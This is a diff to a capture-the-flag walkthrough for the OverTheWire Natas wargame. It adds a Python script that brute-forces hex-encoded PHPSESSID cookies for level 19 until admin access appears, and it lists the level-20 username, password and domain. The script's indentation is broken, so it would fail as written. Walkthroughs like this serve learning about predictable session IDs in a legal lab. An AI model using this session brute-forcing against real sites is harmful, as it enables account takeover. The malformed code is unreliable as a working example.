@@ -1012,9 +1012,44 @@ Step 2: You will see the page like this
 Step 3: Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
 
 
+    import requests
+    import re
+
+    username = 'natas19'
+    password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
+
+    url = 'http://natas19.natas.labs.overthewire.org'
+
+    for i in range(641):
+
+        session = requests.Session()
+        print("Trying with: " + str(i))
+
+           response = session.get(
+           url,
+            cookies={
+            "PHPSESSID": ("%d-admin" % i).encode().hex()
+            },
+            auth=(username, password)
+            )  
+
+            if "You are an admin" in response.text:
+            print(response.text)
+            break
+
+
 Step 4: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for Natas20
 
+![image](./images-1/image-19-1.png)
 
+Step 5: Finally it will get the password for Natas20
 
+![image](./images-1/image-19-2.png)
 
+## Level-20
++ Username : natas20
++  Password : p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
++ Domain : http://natas20.natas.labs.overthewire.org
+
+## Explination
 
